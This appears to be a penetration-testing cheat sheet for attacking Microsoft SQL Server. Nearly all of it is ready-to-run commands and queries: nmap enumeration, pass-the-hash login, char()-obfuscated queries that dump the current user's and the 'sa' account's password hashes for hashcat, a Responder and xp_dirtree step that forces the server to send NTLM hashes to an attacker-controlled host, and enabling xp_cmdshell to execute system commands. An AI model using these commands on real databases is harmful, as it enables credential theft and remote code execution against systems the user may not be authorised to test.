# MSSQL enumeration and exploitation
   * [Initial enumeration](#initial-enumeration)
   * [Connecting to an MSSQL database](#connecting-to-an-mssql-database)
   * [Enumerating a database](#enumerating-a-database)
   * [Getting NTLM hashes](#getting-ntlm-hashes)
   * [Executing system commands](#executing-system-commands)

## Initial enumeration
```bash
nmap -vv -p 1433 -sT --script=+ms-sql* <ip>
```

## Connecting to an MSSQL database
- Connect to a database using `mssql-cli`:
```bash
mssql-cli -U <username> -P '<password>' -d <database> -S "tcp:<ip>,1433"
mssql-cli -U <username> -P '<password>' -d <database> -S "tcp:<ip>,1433" -E # Windows auth
```
- Or connect using `mssqlclient.py`:
```bash
mssqlclient.py -db <database> <user>:'<password>'@<ip>
mssqlclient.py -db <database> -windows-auth <user>:'<password>'@<ip> # Windows auth
mssqlclient.py -db <database> -hashes LMHASH:NTHASH <user>@<ip> -windows-auth # Using hashes instead of a password
```

## Enumerating a database
- Get version:
```SQL
SELECT @@version; 
```
- Get current database:
```SQL
SELECT db_name(); 
```
- List non-default databases:
```SQL
SELECT name FROM master.sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb'); 
```
- Get current user:
```SQL
SELECT original_login();
```
- List user permissions:
```SQL
SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
```
- Get current user's password hash _(encoded for 1731 hashcat mode)_:
```SQL
SELECT convert(varchar(MAX),(loginproperty(original_login(),(char(080)+char(097)+char(115)+char(115)+char(119)+char(111)+char(114)+char(100)+char(072)+char(097)+char(115)+char(104))) ),1);
```
- List all users:
```SQL
SELECT name FROM sys.syslogins ORDER BY 1;
```
- Get `sa` user's password hash _(encoded for 1731 hashcat mode)_:
```SQL
SELECT convert(varchar(MAX),(loginproperty((char(115)+char(97)),(char(080)+char(097)+char(115)+char(115)+char(119)+char(111)+char(114)+char(100)+char(072)+char(097)+char(115)+char(104))) ),1);
```
- List tables:
```SQL
SELECT table_schema,table_name FROM information_schema.tables ORDER BY 1; 
```
- List table columns:
```SQL
SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' ORDER BY 1;  
```
- Search for `%user%` like tables:
```SQL
SELECT table_schema,table_name FROM information_schema.tables WHERE lower(table_name) LIKE char(37)+char(117)+char(115)+char(101)+char(114)+char(37) ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY; -- LIMIT/OFFSET works on 2012+ version 
```

## Getting NTLM hashes
- Listen to SMB incoming connections:
```bash
sudo responder -I tun0
```
- Sending auth SMB request to local machine using SQL:
```SQL
EXEC xp_dirtree '\\<ip>\test';
```

## Executing system commands
- Configure _(if user has privileges to do it)_:
```SQL
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE;  
EXEC sp_configure 'xp_cmdshell', 1;  
RECONFIGURE; 
```
- Run commands:
```SQL
EXEC xp_cmdshell '<command>';
```
